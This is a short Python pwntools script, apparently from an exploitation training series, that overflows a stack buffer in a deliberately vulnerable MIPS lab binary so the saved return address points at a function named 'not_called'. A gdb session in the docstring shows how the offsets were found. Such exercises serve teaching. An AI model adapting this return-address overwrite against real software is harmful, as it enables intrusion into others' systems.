#!/usr/bin/python

"""
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x00400860 <+0>:	addiu	sp,sp,-160
   0x00400864 <+4>:	sw	ra,156(sp)
...
   0x004008e4 <+132>:	lw	ra,156(sp)
   0x004008e8 <+136>:	lw	s8,152(sp)
   0x004008ec <+140>:	addiu	sp,sp,160
   0x004008f0 <+144>:	jr	ra
   0x004008f4 <+148>:	nop
End of assembler dump.
(gdb) b vulnerable
Breakpoint 1 at 0x40087c: file src/02-overwrite-ret.c, line 11.
(gdb) b *0x004008e4
Breakpoint 2 at 0x4008e4: file src/02-overwrite-ret.c, line 16.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:11
11		printf("> ");
(gdb) p &buffer[0]
$1 = 0x7fffef08 "\177~\272X\177~\243\f\177|\210D"
(gdb) c
Continuing.

Breakpoint 2, 0x004008e4 in vulnerable () at src/02-overwrite-ret.c:16
16	}
(gdb) p/x $sp+156
$3 = 0x7fffef8c
"""

import struct
import sys

from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

binary_path = './bin/mips/02-overwrite-ret'

ra_saved_addr = 0x7fffef8c
buffer_addr = 0x7fffef08

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p32(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
